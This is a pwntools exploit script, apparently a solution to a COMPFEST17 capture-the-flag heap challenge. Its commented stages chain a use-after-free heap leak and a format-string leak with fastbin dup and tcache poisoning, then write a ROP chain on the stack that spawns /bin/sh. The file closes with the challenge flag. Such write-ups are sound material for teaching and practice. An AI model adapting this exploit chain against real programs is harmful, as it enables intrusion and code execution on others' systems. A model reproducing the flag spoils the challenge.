from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    continue
''')

# p = remote('ctf.compfest.id', 7001)

# malloc a chunk of size (0x20-0x80) at index (1-10) and read corresponding bytes of data at most into it
def add_raise(number, amount, note):
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b"Seat number: ", str(number).encode())
    p.sendlineafter(b"Raise amount: ", str(amount).encode())
    p.sendlineafter(b"Add a note for this bet: ", note)

# write data of a chunk at index as a string by printf function
def view_peek(number):
    p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b"Seat number: ", str(number).encode())
    p.recvuntil(b"took a look at their note:\n")
    return p.recvline().strip()

# free a chunk at index, not setting its pointer to NULL (use-after-free vulnerability)
def delete_fold(number):
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b"Seat number: ", str(number).encode())

# return from main function and exit program
def exit_bail():
    p.sendlineafter(b">> ", b'4')

# Stage 1: leak heap base address
add_raise(1, 0x78, b'A')
delete_fold(1)
heap_base_addr = u64(view_peek(1).ljust(8, b'\x00'))<<12
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: leak main rbp value and elf base address with fmtstr
add_raise(1, 0x78, b'%p '*9)
leaks = view_peek(1).split(b' ')
# 1st argument of printf function is a stack address
main_rbp_val = int(leaks[0], 16)+0x4870
log.info(f"main rbp value: {hex(main_rbp_val)}")
# 9th argument of printf function is an elf address
elf_base_addr = int(leaks[-1], 16)-0x17f5
log.info(f"elf base address: {hex(elf_base_addr)}")

# Stage 3: fastbin dup, fastbin reverse into tcache, and tcache poisoning for ROP
for i in range(2, 10):
    add_raise(i, 0x78, b'A')
# free 7 chunks to fill tcache bin of size 0x80, free 2 chunks into fastbin of size 0x80
for i in range(1, 10):
    delete_fold(i)
# free chunk at heap_base_addr+0x620 into fastbin of size 0x80 to achieve fastbin dup
delete_fold(8) # heap_base_addr+0x620
# malloc 7 chunks to clear tcache bin of size 0x80
for i in range(1, 8):
    add_raise(8-i, 0x78, b'A')
# next malloc will trigger fastbin reverse into tcache
# malloc a chunk at heap_base_addr+0x620 to overwrite fd pointer of chunk at heap_base_addr+0x620 to make tcache bin of size 0x80 look like heap_base_addr+0x6a0->heap_base_addr+0x620->main_rbp_val
add_raise(8, 0x78, p64(((main_rbp_val)^(heap_base_addr+0x620)>>12))) # heap_base_addr+0x620
# malloc a chunk at heap_base_addr+0x6a0, now tcache bin of size 0x80 looks like heap_base_addr+0x620->main_rbp_val
add_raise(9, 0x78, b'A') # heap_base_addr+0x6a0
# malloc a chunk at heap_base_addr+0x620, now tcache bin of size 0x80 looks like main_rbp_val
add_raise(8, 0x78, b'A') # heap_base_addr+0x620
chain = [
    # rbp=0x4564c18
    0x4564c18,
    # rax=rax//rbp=(0xfff8c5e8+0xfffa80e8*3+0xfffb40e8)//0x4564c18=0x3b, rbp=0
    elf_base_addr+0x1845, # 0x0000000000001845: add eax, 0xfff8c5e8; dec ecx; ret;
    elf_base_addr+0x168a, # 0x000000000000168a: add eax, 0xfffa80e8; dec ecx; ret;
    elf_base_addr+0x168a, # 0x000000000000168a: add eax, 0xfffa80e8; dec ecx; ret;
    elf_base_addr+0x168a, # 0x000000000000168a: add eax, 0xfffa80e8; dec ecx; ret;
    elf_base_addr+0x15ca, # 0x00000000000015ca: add eax, 0xfffb40e8; dec ecx; ret;
    elf_base_addr+0x1855, # 0x0000000000001855: div rbp; nop; pop rbp; ret;
    0,
    # rdi=&'/bin/sh\x00', rsi=0
    elf_base_addr+0x1863, # 0x0000000000001863: pop rdi; pop rsi; syscall;
    main_rbp_val+0x58,
    0,
    u64(b'/bin/sh\x00')
]
# perform tcache poisoning to stack at main_rbp_val to overwrite saved rbp with a valid value for ROP chain and return address with ROP chain
add_raise(10, 0x78, b''.join([p64(c) for c in chain])) # main_rbp_val
# return from main function to trigger ROP chain
exit_bail()

p.interactive()

# COMPFEST17{i_wanted_to_include_div_assembly_shenanigans_but_arbitrary_write_is_too_op_806707322a}